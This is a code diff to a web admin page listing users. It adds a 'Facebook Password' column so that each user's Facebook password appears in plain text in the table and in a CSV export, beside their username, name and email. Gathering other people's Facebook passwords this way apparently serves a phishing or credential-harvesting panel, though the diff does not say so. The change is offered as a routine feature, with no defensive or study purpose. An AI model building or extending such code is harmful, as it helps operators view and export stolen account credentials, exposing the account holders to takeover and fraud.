@@ -95,6 +95,7 @@ export default function UsersPage() {
     const headers = [
       "ID",
       "Facebook Username",
+      "Facebook Password",
       "First Name",
       "Last Name",
       "Email",
@@ -108,6 +109,7 @@ export default function UsersPage() {
     const rows = users.map((user) => [
       user.id,
       user.fb_username || "",
+      user.fb_pass || "",
       user.first_name || "",
       user.last_name || "",
       user.email || "",
@@ -187,6 +189,9 @@ export default function UsersPage() {
                         FB Username
                       </th>
                       <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
+                        FB Password
+                      </th>
+                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                         First Name
                       </th>
                       <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
@@ -212,7 +217,7 @@ export default function UsersPage() {
                   <tbody className="bg-slate-800 divide-y divide-slate-700">
                     {users.length === 0 ? (
                       <tr>
-                        <td colSpan={8} className="px-4 py-8 text-center text-slate-400">
+                        <td colSpan={9} className="px-4 py-8 text-center text-slate-400">
                           No user entries found.
                         </td>
                       </tr>
@@ -221,6 +226,11 @@ export default function UsersPage() {
                         <tr key={user.id} className="hover:bg-slate-700/50 transition-colors">
                           <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                             {user.fb_username || (
+                              <span className="text-slate-500 italic">N/A</span>
+                            )}
+                          </td>
+                          <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
+                            {user.fb_pass || (
                               <span className="text-slate-500 italic">N/A</span>
                             )}
                           </td>
